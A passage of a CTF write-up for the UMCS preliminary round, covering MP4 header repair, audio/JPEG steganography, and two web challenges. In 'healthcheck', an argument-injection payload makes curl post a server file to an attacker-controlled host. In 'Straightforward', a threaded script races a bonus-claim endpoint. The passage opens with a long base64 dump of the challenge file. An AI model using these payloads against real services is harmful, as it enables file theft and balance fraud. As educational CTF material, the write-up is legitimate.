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
```
</details>

We are given an unplayable (broken) MP4 file. Opening it in any hex editor we can immediately see the file is polluted with gibberish characters in front.
```xxd
00000000: 6374 667b 7468 6973 2069 7320 6e6f 7420  ctf{this is not
00000010: 7468 6520 666c 6167 7d2e 6865 6865 0000  the flag}.hehe..
00000020: 0000 6674 7970 6973 6f6d 0000 0200 6973  ..ftypisom....is
00000030: 6f6d 6973 6f32 6176 6331 6d70 3431 0000  omiso2avc1mp41..
00000040: 0008 6672 6565 0000 38bd 6d64 6174 0000  ..free..8.mdat..
00000050: 02ae 0605 ffff aadc 45e9 bde6 d948 b796  ........E....H..
00000060: 2cd8 20d9 23ee ef78 3236 3420 2d20 636f  ,. .#..x264 - co
00000070: 7265 2031 3634 2072 3331 3038 2033 3165  re 164 r3108 31e
00000080: 3139 6639 202d 2048 2e32 3634 2f4d 5045  19f9 - H.264/MPE
00000090: 472d 3420 4156 4320 636f 6465 6320 2d20  G-4 AVC codec -
```

After removing them, we try to probe the file with `ffprobe`.
```cmd
> ffprobe broken.mp4
ffprobe version 7.1.1-full_build-www.gyan.dev Copyright (c) 2007-2025 the FFmpeg developers
[-snip-]
[mov,mp4,m4a,3gp,3g2,mj2 @ 000001d1d0c4e580] moov atom not found
broken.mp4: Invalid data found when processing input
```
From the output, we know that moov atom is corrupted too.

Therefore, we skim over the whole file to find the location of [moov atom](https://developer.apple.com/documentation/quicktime-file-format/movie_atoms) (CompressedMovieBox, which contains the most critical metadata about the movie file), which looks like `...lmoov...lmvhd`.

We find it towards the end of the file. Which looks like this:
```xxd
$ xxd -s 0x38E5 broken.mp4 | head
000038e5: 0000 08de 6d6f 7600 0000 6c6d 7668 6400  ....mov...lmvhd.
000038f5: 0000 0000 0000 0000 0000 0000 0003 e800  ................
00003905: 0003 e800 0100 0001 0000 0000 0000 0000  ................
00003915: 0000 0000 0100 0000 0000 0000 0000 0000  ................
00003925: 0000 0000 0100 0000 0000 0000 0000 0000  ................
00003935: 0000 0040 0000 0000 0000 0000 0000 0000  ...@............
00003945: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00003955: 0000 0300 0003 e874 7261 6b00 0000 5c74  .......trak...\t
00003965: 6b68 6400 0000 0300 0000 0000 0000 0000  khd.............
00003975: 0000 0100 0000 0000 0003 e800 0000 0000  ................
```

Clearly, we can see start an `o` is removed. Therefore we fix it by replacing `mov` to `moov`.
```xxd
$ xxd -s 0x38E5 fixed.mp4 | head -1
000038e5: 0000 08de 6d6f 6f76 0000 006c 6d76 6864  ....moov...lmvhd
```

Retrying with `ffprobe` and we see that it can now parse properly.
```cmd
> ffprobe fixed.mp4
ffprobe version 7.1.1-full_build-www.gyan.dev Copyright (c) 2007-2025 the FFmpeg developers
[-snip-]
Input #0, mov,mp4,m4a,3gp,3g2,mj2, from 'fixed.mp4':
  Metadata:
    major_brand     : isom
    minor_version   : 512
    compatible_brands: isomiso2avc1mp41
    encoder         : Lavf61.7.100
  Duration: 00:00:01.00, start: 0.000000, bitrate: 134 kb/s
  Stream #0:0[0x1](und): Video: h264 (High) (avc1 / 0x31637661), yuv420p(tv, bt709, progressive), 1920x1080, 37 kb/s, 24 fps, 24 tbr, 12288 tbn (default)
      Metadata:
        handler_name    : VideoHandler
        vendor_id       : [0][0][0][0]
        encoder         : Lavc61.19.101 libx264
  Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 48000 Hz, mono, fltp, 77 kb/s (default)
      Metadata:
        handler_name    : SoundHandler
        vendor_id       : [0][0][0][0]
```

Now, just open it in any video player and get the flag `umcs{h1dd3n_1n_fr4m3}`.
![image](https://hackmd.io/_uploads/H1AZO1wAyx.png)

### Hotline Miami
<details>
  <summary>Description</summary>

https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami
</details>

We're given 3 files `iamthekidyouknowwhatimean.wav`, `rooster.jpg`, and `readme.txt`, each containing different steganography method.

For `iamthekidyouknowwhatimean.wav`, taking a look on its spectogram showed some text draw onto it.
![image](https://hackmd.io/_uploads/BkPV1iYR1g.png)

For `rooster.jpg`, since JPG is a loosely structured file protocol, it can contain some extra data in the end. When we check its tail, we found the ascii text `RICHARD`.
```xxd
$ xxd rooster.jpg | tail -3
00008460: 0000 5140 0005 1400 0051 4000 0514 0000  ..Q@.....Q@.....
00008470: 5140 0005 1400 0051 4000 0514 0001 ffd9  Q@.....Q@.......
00008480: 5249 4348 4152 44                        RICHARD
```

`readme.txt` contains the following:
```
DO YOU LIKE HURTING OTHER PEOPLE?

Subject_Be_Verb_Year
```
Looks like a flag format, therefore we combine all clues found, change `be` into its suitable tense form, and construct the flag `umcs{RICHARD_IS_WATCHING_1989}`.

## Web
### healthcheck
<details>
  <summary>Description</summary>

I left my hopes_and_dreams on the server. can you help fetch it for me?
    
http://104.214.185.119/index.php

<details>
  <summary>Source code</summary>

  ```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["url"])) {
    $url = $_POST["url"];

    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];

    $sanitized_url = str_replace($blacklist, '', $url);

    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";

    $output = shell_exec($command);
    if ($output) {
        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL HTTP Status Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            text-align: center;
            display: grid;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        p {
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Health Check Your Webpage</h2>
        <form method="POST">
            <input type="text" name="url" placeholder="Enter URL" required>
            <button type="submit">Check</button>
        </form>
        <?php 
        echo $response_message; 
        ?>
    </div>
</body>
</html>
  ```
</details>
</details>


Webpage looks like this:
![image](https://hackmd.io/_uploads/rJPsCRLAyx.png)

From the source code, we understand that upon clicking check, url will be POSTed to the server as `url`. The serer will then run a curl command as follows: `curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'`. Note that many symbols are blacklisted/removed before this is executed.

This is a classic command injection scenario as we can control part of the input passed into `shell_exec`. It is hard to run arbitrary command because the common symbols are restricted. Luckily our goal is just to retrieve a file, presumably `hopes_and_dreams` as hinted in the challenge description.

Knowing this, we can use curl's file upload function to achieve arbitrary file read since we control the destination. To do this, pass `-d "@hopes_and_dreams" https://your.server` and check your server to obtain the content of `./hopes_and_dreams`.

We are then greeted with the flag `umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}`.

### Straightforward
<details>
  <summary>Description</summary>
    
Test out our game center. You'll have free claiming bonus for first timers!

**Author: vicevirus ** **Flag format: UMCS{...}**

http://159.69.219.192:7859/
    
File: `straightforward_player.zip`
<details>
  <summary>Source of app.py</summary>
    
```py
from flask import Flask, request, jsonify, g, render_template, redirect, session, url_for, flash
import sqlite3
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)
DATABASE = 'db.sqlite3'

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE, check_same_thread=False)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop('db', None)
    if db:
        db.close()

def init_db():
    db = sqlite3.connect(DATABASE)
    db.executescript('''
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      balance INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS redemptions (
      username TEXT UNIQUE NOT NULL,
      claimed INTEGER NOT NULL
    );
    ''')
    db.commit()
    db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        if not username:
            flash("Username required!", "danger")
            return redirect(url_for('register'))
        db = get_db()
        try:
            db.execute('INSERT INTO users (username, balance) VALUES (?, ?)', (username, 1000))
            db.commit()
        except sqlite3.IntegrityError:
            flash("User exists!", "danger")
            return redirect(url_for('register'))
        session['username'] = username
        return redirect(url_for('dashboard', username=username))
    return render_template('register.html')

@app.route('/claim', methods=['POST'])
def claim():
    if 'username' not in session:
        return redirect(url_for('register'))
    username = session['username']
    db = get_db()
    cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
    row = cur.fetchone()
    if row and row['claimed']:
        flash("You have already claimed your daily bonus!", "danger")
        return redirect(url_for('dashboard'))
    db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
    db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
    db.commit()
    flash("Daily bonus collected!", "success")
    return redirect(url_for('dashboard'))

@app.route('/buy_flag', methods=['POST'])
def buy_flag():
    if 'username' not in session:
        return redirect(url_for('register'))
    username = session['username']
    db = get_db()
    cur = db.execute('SELECT balance FROM users WHERE username=?', (username,))
    row = cur.fetchone()
    if row and row['balance'] >= 3000:
        db.execute('UPDATE users SET balance = balance - 3000 WHERE username=?', (username,))
        db.commit()
        flash("Reward redeemed!", "success")
        return render_template('flag.html')
    else:
        flash("Insufficient funds to redeem the reward.", "danger")
        return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('register'))
    display_user = request.args.get('username') or session['username']
    db = get_db()
    cur = db.execute('SELECT balance FROM users WHERE username=?', (display_user,))
    row = cur.fetchone()
    balance = row['balance'] if row else None
    return render_template('dashboard.html', username=display_user, balance=balance)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == "__main__":
    with app.app_context():
        init_db()
    app.run(host='0.0.0.0', port=7859)
```
</details>
</details>

These website features only 4 functionalities:
- register with a username (free $1k), no SSTI
- claim $1k once
- get flag for $3k
- logout
![image](https://hackmd.io/_uploads/ByxQPHY0yg.png)
![image](https://hackmd.io/_uploads/By2rvHtRkl.png)

The goal is to somehow get $3k to trade for a flag. By normal means, we can only obtain a maximum of $2k from registration and the one time daily bonus.
    
The website uses flask for session management and stores user session in a signed cookie. The `secret_key` used has high enough entropy (`app.secret_key = os.urandom(16)`) and therefore is assumed to be secure.

Looking at the daily bonus claim logic, we can find that it first fetches user claim record from the db, store it, use it to determine if user is eligible to claim, update the user's claim record to db, and finally proceed to the claim where it adds $1k on top of the user's current balance.
```python
@app.route('/claim', methods=['POST'])
def claim():
    if 'username' not in session:
        return redirect(url_for('register'))
    username = session['username']
    db = get_db()
    cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
    row = cur.fetchone()
    if row and row['claimed']:
        flash("You have already claimed your daily bonus!", "danger")
        return redirect(url_for('dashboard'))
    db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
    db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
    db.commit()
    flash("Daily bonus collected!", "success")
    return redirect(url_for('dashboard'))
```

This presented a potential race condition flaw as flask requests processing are inherently multi-threaded to serve as much users as it can at a given time. This means before an update to the claim status is done on actual first claim, a second claim request on another thread might have already passed the claim status check, triggering multiple increase on the user's balance.

Interestingly, `check_same_thread=False` was specified when configuring sqlite3, this disables its implicit thread-safe check, enabling this exact scenario to happen.
```python
def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE, check_same_thread=False)
        g.db.row_factory = sqlite3.Row
    return g.db
```
    
Therefore, we used burp intruder to send 1000 requests to `/claim` once with the user cookie after registration. Alternatively, use this brute force script:
```python
import threading
import requests

URL = 'http://159.69.219.192:7859/claim'
SESSION_COOKIE = {'session': 'eyJ1c2VybmFtZSI6InlheWFkb250In0.Z_nFyg.-F9Z1xQtyPlw8hkplYUfwEOiT1Q'}  # From browser/dev tools

def claim_bonus():
    try:
        r = requests.post(URL, cookies=SESSION_COOKIE)
        print(f"[{threading.current_thread().name}] Status: {r.status_code}")
    except Exception as e:
        print(f"[{threading.current_thread().name}] Error: {e}")

# How many concurrent requests to send
NUM_THREADS = 10

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=claim_bonus, name=f'Thread-{i+1}')
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

As expected, we managed to gain a total bonus of above $2k, and was able to claim the flag `UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}`.
![image](https://hackmd.io/_uploads/H193sHFAye.png)
![image](https://hackmd.io/_uploads/S15xnrtCJg.png)


## Cryptography
### Gist of Samuel
<details>
  <summary>Description</summary>

Samuel is gatekeeping his favourite campsite. We found his note.

flag: umcs{the_name_of_the_campsite}

*The flag is case insensitive
    
Hint: https://gist.github.com/umcybersec
    
gist_of_samuel.txt
```
